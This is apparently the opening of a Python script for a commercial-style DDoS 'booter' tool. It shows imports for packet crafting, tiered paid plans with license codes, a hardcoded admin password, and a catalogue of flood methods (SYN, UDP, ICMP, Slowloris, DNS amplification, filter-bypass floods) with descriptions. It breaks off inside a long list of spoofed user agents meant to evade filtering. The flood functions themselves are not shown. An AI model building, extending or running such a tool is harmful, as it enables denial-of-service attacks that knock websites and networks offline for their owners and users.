#!/usr/bin/env python3
"""
    ┌─────────────────────────────────────────────────┐
    │   LAYER 7 & LAYER 4 DDOS TOOL                   │
    │   WITH PROXY ROTATION, BYPASS & ADMIN PANEL     │
    │   SPRAY YOUR PAYLOAD IN MY PORT !                │
    └─────────────────────────────────────────────────┘
    Author: bob (optimised proxy RPS)
    Legal: For authorised testing only.
"""

import sys
import time
import random
import asyncio
from collections import Counter
from datetime import datetime, timedelta
import aiohttp
import re
import os
import socket
import struct
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import ssl
import multiprocessing as mp

# Optional SOCKS support
try:
    from aiohttp_socks import ProxyConnector, ProxyType
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False

# Layer 4 – scapy for packet crafting (optional, fallback to raw sockets)
try:
    from scapy.all import IP, ICMP, UDP, TCP, send
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

COLORS = {
    'red':     '\033[91m',    'bred':    '\033[1;91m',
    'green':   '\033[92m',    'bgreen':  '\033[1;92m',
    'yellow':  '\033[93m',    'byellow': '\033[1;93m',
    'blue':    '\033[94m',    'bblue':   '\033[1;94m',
    'magenta': '\033[95m',    'bmagenta':'\033[1;95m',
    'cyan':    '\033[96m',    'bcyan':   '\033[1;96m',
    'white':   '\033[97m',    'bwhite':  '\033[1;97m',
    'gray':    '\033[90m',    'bgray':   '\033[1;90m',
    'orange':  '\033[38;5;208m', 'pink':    '\033[38;5;206m',
    'purple':  '\033[38;5;135m', 'teal':    '\033[38;5;45m',
    'lime':    '\033[38;5;118m', 'violet':  '\033[38;5;165m',
    'gold':    '\033[38;5;220m',
}

RESET = '\033[0m'
BOLD  = '\033[1m'

current_color = COLORS['bcyan']
current_name  = 'Bright Cyan'

# Use raw strings for ASCII art to avoid escape sequence warnings
ASCII_MENUS = {
    'devil': r"""
      ⢸⣿⣧⡀⠀⣠⣴⣶⣶⣶⣶⣶⣦⣤⣀⠀⣰⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠨⣿⣿⣷⣜⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣵⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢘⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣿⣿⡙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀ ⢻⣿⣿⣷⣦⣀⣉⣽⣿⣿⣿⣿⣍⣁⣠⣾⣿⣿⣿⠁⠀⠀⠀⠀⣀⣀⡙⣷⣦⣄⠀⠀⠀
⠀⠀⠀  ⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⢀⣠⣴⣾⠿⠟⣛⣭⣿⡿⠿⢿⣦⡀
⠀  ⠀⠀⠀ ⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣅⣴⣿⡿⠟⠁⠀⠀⢸⠭⠋⠁⠀⠀⠀⠀
⠀ ⠀⠀⠀⠀⠀ ⠀⠉⠛⠿⣿⣿⣿⣿⣿⡿⠟⠋⣹⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀""",
    'bomb drop': r"""⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣀⡀⠀⠀⠠⡀⠀⠀⣿⣷⣆⣀⣤⣶⣿⣿⡿⠋⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⡫⡳⣄⢰⣿⣿⣮⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠠⡀⠘⢿⣿⣦⣬⣷⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠠⣄⡀⢰⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢰⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣍⢄⡤⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣠⣶⣯⣿⣿⣿⡿⠛⠛⠉⠑⢷⣍⡛⢿⣷⣤⣴⣴⡶⠂⠀⠀⠀⠀⠀⠀
⠀⠐⠿⠿⠛⠋⠉⠀⠀⠻⢷⣄⠀⢶⣦⣌⠀⢠⡾⠟⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢿⣷⣄⠀⠁⠀⡀⠙⠻⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⠓⠸⣿⣷⣦⡈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣶⣦⣀⠀⠀⠀⠀⠈⠛⠿⣿⣶⡤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠻⣿⣧⣤⡀⠀⢀⡀⠀⠘⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣤⣤⣀⠀⠙⠏⠀⠀⢿⣿⣷⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠻⣿⣿⣷⣄⠀⠀⠀⠀⠙⠿⣿⣷⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⡷⠀⠀⠀⠀⠀⠻⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀  ⠀⠀⠀⠀⠈⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣏⣩⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿""",
    'ahego': r"""
⣿⣿⣿⡷⠊⡢⡹⣦⡑⢂⢕⢂⢕⢂⢕⢂⠕⠔⠌⠝⠛⠶⠶⢶⣦⣄⢂⢕⢂⢕
⣿⣿⠏⣠⣾⣦⡐⢌⢿⣷⣦⣅⡑⠕⠡⠐⢿⠿⣛⠟⠛⠛⠛⠛⠡⢷⡈⢂⢕⢂
⠟⣡⣾⣿⣿⣿⣿⣦⣑⠝⢿⣿⣿⣿⣿⣿⡵⢁⣤⣶⣶⣿⢿⢿⢿⡟⢻⣤⢑⢂
⣾⣿⣿⡿⢟⣛⣻⣿⣿⣿⣦⣬⣙⣻⣿⣿⣷⣿⣿⢟⢝⢕⢕⢕⢕⢽⣿⣿⣷⣔
⣿⣿⠵⠚⠉⢀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⢕⢕⢕⢕⢕⢕⣽⣿⣿⣿⣿
⢷⣂⣠⣴⣾⡿⡿⡻⡻⣿⣿⣴⣿⣿⣿⣿⣿⣿⣷⣵⣵⣵⣷⣿⣿⣿⣿⣿⣿⡿
⢌⠻⣿⡿⡫⡪⡪⡪⡪⣺⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
⠣⡁⠹⡪⡪⡪⡪⣪⣾⣿⣿⣿⣿⠋⠐⢉⢍⢄⢌⠻⣿⣿⣿⣿⣿⣿⣿⣿⠏⠈
⡣⡘⢄⠙⣾⣾⣾⣿⣿⣿⣿⣿⣿⡀⢐⢕⢕⢕⢕⢕⡘⣿⣿⣿⣿⣿⣿⠏⠠⠈
⠌⢊⢂⢣⠹⣿⣿⣿⣿⣿⣿⣿⣿⣧⢐⢕⢕⢕⢕⢕⢅⣿⣿⣿⣿⡿⢋⢜⠠⠈""",
    'amaterasu eye': r"""
⠤⣤⣤⣤⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀
⢠⣤⣤⡄⣤⣤⣤⠄⣀⠉⣉⣙⠒⠤⣀⠀⠀
⣄⢻⣿⣧⠻⠇⠋⠀⠋⠀⢘⣿⢳⣦⣌⠳⠄
⠈⠃⠙⢿⣧⣙⠶⣿⣿⡷⢘⣡⣿⣿⣿⣷⣄
⠀⠀⠀⠀⠉⠻⣿⣶⠂⠘⠛⠛⠛⢛⡛⠋⠉
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⢸⠃⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣾⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⠅⠀⠀⠀⠀⠀⣿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀⠀⠀⢸⠀⠀⠀""",
    'haxor': r"""
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀""",
    'l7 net': r"""
    __ _____  
   / //__  /      
  / /   / /       
 / /___/ /        
/_____/_/_     __ 
   / | / /__  / /_
  /  |/ / _ \/ __/
 / /|  /  __/ /_  
/_/ |_/\___/\__/ """,
}

current_ascii = 'devil'

PLANS = {
    'FREE': {
        'name': 'Free Plan',
        'workers': 100,
        'duration': 120,
        'methods': ['HTTP GET', 'HTTPS POST','STRESS TEST','GET/POST MIX'],
        '76034a9f5bef30b9dee701711d30bed6': ['8k3n9p2m', 'q7w4e1r6', 'a5s8d3f2']
    },
    'HARD': {
        'name': 'Hard Plan',
        'workers': 250,
        'duration': 300,
        'methods': ['HTTP GET', 'HTTPS GET', 'HTTP POST', 'HTTPS POST', 'DNS-AMP', 'STRESS TEST','SOCKET-AMP'],
        '76034a9f5bef30b9dee701711d30bed6': ['h4k9j2n7', 'x6c8v1b3', 'm9n2b5v4','6.4']
    },
    'PRO': {
        'name': 'Pro Plan',
        'workers': 1000,
        'duration': 3600,
        'methods': ['HTTP GET', 'HTTPS GET', 'HTTP POST', 'HTTPS POST', 'CURL', 'GET/POST MIX', 'DNS-AMP', 'STRESS TEST','CONCURRENT HOLD','SOCKET-AMP', 'BYPASS-GET', 'BYPASS-POST', 'RANDOM-PATH'],
        '76034a9f5bef30b9dee701711d30bed6': ['p3r7o9k2', 'l8i4u6y1', 't5g9h3j7']
    },
    'VIP': {
        'name': 'VIP Plan',
        'workers': 1500,
        'duration': 9500,
        'methods': ['HTTP GET', 'HTTPS GET', 'HTTP POST', 'HTTPS POST', 'CURL', 'GET/POST MIX', 'BROWSER', 'HULK', 'DNS-AMP', 'STRESS TEST', 'TLS-VIP', 'CONCURRENT HOLD','SOCKET-AMP','NET-BYPASS', 'BYPASS-GET', 'BYPASS-POST', 'RANDOM-PATH'],
        '76034a9f5bef30b9dee701711d30bed6': ['v9i2p8k4', 'z7x3c6v1', 'w4q8e2r5','xyz','.']
    }
}

current_license = {
    'plan': 'FREE',
    'code': '8k3n9p2m',
    'expires': datetime.now() + timedelta(days=5)
}

# Admin mode
admin_mode = False
ADMIN_PASSWORD = "newnew@123"
ADMIN_WORKERS = 5000
ADMIN_DURATION = 86400  # 24 hours

# All Layer 7 methods (from all plans)
ALL_L7_METHODS = sorted(list(set(
    method for plan in PLANS.values() for method in plan['methods']
)))

# Layer 4 methods
LAYER4_METHODS = [
    'TCP SYN FLOOD',
    'UDP FLOOD',
    'ICMP FLOOD',
    'SLOWLORIS',
    'CONNECTION EXHAUSTION',
    'PORT SCAN & ATTACK'
]

# Combined for admin
ALL_METHODS = ALL_L7_METHODS + LAYER4_METHODS

# Method descriptions
METHOD_DESCRIPTIONS = {
    'HTTP GET': 'Standard HTTP GET requests – simple and fast.',
    'HTTPS GET': 'Encrypted HTTPS GET requests – bypasses some filters.',
    'HTTP POST': 'HTTP POST with random data – consumes more resources.',
    'HTTPS POST': 'Encrypted POST requests – good for SSL targets.',
    'CURL': 'Simulates cURL client – generic but effective.',
    'GET/POST MIX': 'Alternates between GET and POST – unpredictable.',
    'BROWSER': 'Emulates a full browser with extra headers.',
    'HULK': 'Slowloris‑style – keeps connections open.',
    'DNS-AMP': 'Amplified DNS queries (if target is DNS).',
    'STRESS TEST': 'Burst of 50 rapid requests – high RPS.',
    'TLS-VIP': 'Multiple TLS connections – CPU intensive.',
    'CONCURRENT HOLD': '99 parallel requests per worker – max concurrency.',
    'SOCKET-AMP': 'Socket‑level amplification.',
    'NET-BYPASS': '100 rapid requests with varying paths.',
    'BYPASS-GET': 'GET with random path, query, and headers.',
    'BYPASS-POST': 'POST with random payload and headers.',
    'RANDOM-PATH': 'GET with random URL path – evades caching.',
    'TCP SYN FLOOD': 'Layer 4 – floods target with TCP SYN packets (needs root).',
    'UDP FLOOD': 'Layer 4 – sends large UDP packets to random ports.',
    'ICMP FLOOD': 'Layer 4 – ping flood (ICMP echo requests).',
    'SLOWLORIS': 'Layer 4 – holds many connections open with partial requests.',
    'CONNECTION EXHAUSTION': 'Layer 4 – opens thousands of TCP connections and keeps them alive.',
    'PORT SCAN & ATTACK': 'Layer 4 – scans for open ports and immediately floods them.',
}

# Full user-agent list (100+ entries)
USER_AGENTS = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
    'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.113 Safari/534.30',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10',
    'Mozilla/5.0 (X11; U; Linux x86_64; en-ca) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/531.2+',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (Windows x86; rv:19.0) Gecko/20100101 Firefox/19.0',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.2 (KHTML, like Gecko) Chrome/22.0.1216.0 Safari/537.2',
    'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
    'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/10.04 Chromium/14.0.804.0 Chrome/14.0.804.0 Safari/535.1',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17',
    'Mozilla/5.0 (Windows; U; Windows NT 6.1; es-ES) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7',
    'Mozilla/5.0 (Windows NT 5.2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.794.0 Safari/535.1',
    'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.792.0 Safari/535.1',
    'Mozilla/5.0 (Macintosh; rv:9.0a2) Gecko/20111101 Firefox/9.0a2',
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
    'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11',
    'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20',
    'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11',
    'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.107 Safari/535.1',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:27.3) Gecko/20130101 Firefox/27.3',
    'Mozilla/5.0 (Windows; U; Windows NT 6.0; hu-HU) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0',
    'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
    'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; nl-nl) AppleWebKit/533.16 (KHTML, like Gecko) Version/4.1 Safari/533.16',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.6 Safari/537.11',
    'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1467.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
    'Mozilla/5.0 (X11; CrOS i686 1660.57.0) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.46 Safari/535.19',
    'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; nl-nl) AppleWebKit/533.16 (KHTML, like Gecko) Version/4.1 Safari/533.16',
    'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/10.04 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30',
    'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.678.0 Safari/534.20',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0',
    'Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/22.0',
    'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.215 Safari/535.1',
    'Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0',
    'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.814.0 Chrome/14.0.814.0 Safari/535.1',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.811.0 Safari/535.1',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/10.04 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30',
    'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.669.0 Safari/534.20',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.145.93 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS i686 12.433.216) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.105 Safari/534.30',
    'Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1',
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3',
    'Mozilla/5.0 (X11; U; Linux i686; rv:1.9.1.16) Gecko/20120421 Firefox/11.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.145.3.93 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11',
    'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-us) AppleWebKit/534.16+ (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
    'Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.145.93 Safari/537.36',
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3',
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1',
    'Mozilla/5.0 (Windows NT 6.1; de;rv:12.0) Gecko/20120403211507 Firefox/12.0',
    'Mozilla/5.0 (Android 2.2; Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
    'Mozilla/5.0 (Windows; U; Windows NT 6.1; es-ES) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110613 Firefox/6.0a2',
    'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0',
    'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.215 Safari/535.1',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/120.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/119.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/118.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/117.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/116.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/115.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/114.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/113.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/112.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.0.0',
    'Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 6.1; rv:90.0) Gecko/20100101 Firefox/90.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/19A346 Safari/604.1',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
